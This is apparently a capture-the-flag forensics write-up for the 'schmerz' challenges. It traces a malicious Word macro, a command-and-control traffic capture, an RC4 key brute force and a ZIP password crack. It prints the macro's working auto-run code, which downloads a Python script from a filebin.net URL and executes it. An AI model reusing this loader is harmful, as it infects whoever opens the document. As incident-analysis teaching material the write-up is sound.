# schmerz-1

**Flag:** `flag{fA3bDt}`

Extracting the filesystem from the `.ad1` file and going into the `C:\Users\challenge\Downloads` directory, we find a `.dotm` file. Running `olevba` on it, we get this

```vb
.
.
.
Sub RegistryEntry()
    Dim keyName As String
    Dim data As String
    Dim path As String
    Dim myWS As Object
    Dim stype As String
    Set myWS = VBA.CreateObject("WScript.Shell")

    path = "HKEY_CURRENT_USER\Software\Uninstall\"
    keyName = "Application"
    keyValue = "fA3bDt"
    stype = "REG_SZ"
    myWS.RegWrite path & keyName, keyValue, stype
End Sub

Sub DownloadAndOpenFile()
.
.
.
```

The value of the registry entry stored by the malicious macro seems to be `fA3bDt`. I can't confirm if this is correct as I couldn't find a writeup, but it most likely should be.

# schmerz-2

**Flag:** `flag{whoami}`

> [!WARNING]
> Look at the edit for the real flag.

The same macro also shows this:

```vb
Sub Document_Open()
    DownloadAndOpenFile
    RegistryEntry
End Sub
.
.
.
Sub DownloadAndOpenFile()
    Dim url As String
    Dim destinationPath As String
    Dim shell As Object
    Dim pythonPath As String
    Dim command As String
    pythonPath = "python.exe"
    url = "https://filebin.net/g5lap7a613mo3x3o/client.py"
    destinationPath = Environ("TEMP") & "\msserver.py"
    With CreateObject("MSXML2.ServerXMLHTTP")
        .Open "GET", url, False
        .send
        If .Status = 200 Then
            Dim stream As Object
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write .responseBody
            stream.SaveToFile destinationPath, 2
            stream.Close
        End If
    End With
    command = pythonPath & " " & Chr(34) & destinationPath & Chr(34)
    Set shell = CreateObject("WScript.Shell")
    shell.Exec command
End Sub
```

So we can see the first command that seems to run upon the document opening is


```vb
vbpythonPath & " " & Chr(34) & destinationPath & Chr(34)
```

and when you replace all variables with their values,

```py
python.exe "C:\Users\challenge\AppData\Local\Temp\msserver.py}"
```

As with the previous one, I have no clue if this is the correct flag since I couldn't find a writeup, but it should be.

EDIT: So the command was `whoami`, since it was the first command after the remote connection the script made.

# schmerz-3

**Flag** `flag{fA3bDtO6QL}`

We find a file `msserver.py` on the filesystem in `C:\Users\challenge\AppData\Local\Temp\`. This was hinted at in the macro we found in the docm file.

Looking at the code, we see its some kind of encryption scheme for a server that XOR's it with its index and then converts it to base64.

We also have a pcap file `chall.pcap`. With Wireshark we can scan the packets and see base64 data being transferred. We extract the base64 data and reverse XOR it, leading to commands for slowly building a file `a.py` by echo'ing base64 strings into a file `file.txt`.

Decoding the base64 strings in `a.py`, we find another encryption scheme, this time the one the attacker used to encrypt the files. I pasted the code into ChatGPT and it told me it looked like an RC4 encryption schema.

The key in this case is the registry value set earlier (`fA3bDt`), along with 4 random characters. Since we know its a block cipher, we use 4 bytes of the ZIP header that the program encrypted to brute-force the cipher and find the final 4 characters of the key.

```py
from itertools import product
from Crypto.Cipher import ARC4

plaintext = b'PK\x03\x04'
expected_cipher = b'\xe5\x74\xca\x32'
known_key_part = 'fA3bDt'

def rc4_encrypt(key, data):
    cipher = ARC4.new(key.encode())
    return cipher.encrypt(data)

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
possible_keys = (''.join(p) for p in product(charset, repeat=4))

for part in possible_keys:
    full_key = known_key_part + part
    encrypted = rc4_encrypt(full_key, plaintext)
    print(part)
    if encrypted == expected_cipher:
        print(f'Found key: {full_key}')
        exit(0)
```

With this, we get the last 4 characters as `06QL`, and thus the full key.

# schmerz-4

**Flag:** `flag{ajeet-mestry-UBhpOIHnazM-unsplash}`

Decrypting the ZIP file with the key in the previous challenge, we find its password-protected.

After much looking around and dead ends, I think the password might be in the contents of `notepad.exe`, so I dump it.

```
…/Forensics - June 31st/Challenges/Files/schmerz $ python3 volatility3/vol.py -p ./vol_plugins -f memdump.mem windows.memmap --pid 7536 --dump
```

Then we use `strings` to get a wordlist of all posssible passwords, making sure to include utf-16 strings.

```
…/Forensics - June 31st/Challenges/Files/schmerz $ strings -e l pid.7536.dmp > notepadstr
```

Then we simply use `fcrackzip` to find the password.

```
…/Forensics - June 31st/Challenges/Files/schmerz  master ! +25 -1 $ fcrackzip  -b -D -p notepadstr -u schmerz-4/download.zip


PASSWORD FOUND!!!!: pw == 83KvvO60Zf69Yyq8
```

Using this, we extract a file `tv.jpg` from the ZIP. Putting it into aperisolve, we get the string `ajeet-mestry-UBhpOIHnazM-unsplash`.

The organizer "forgot" the flag and said it was good enough, so yeah.

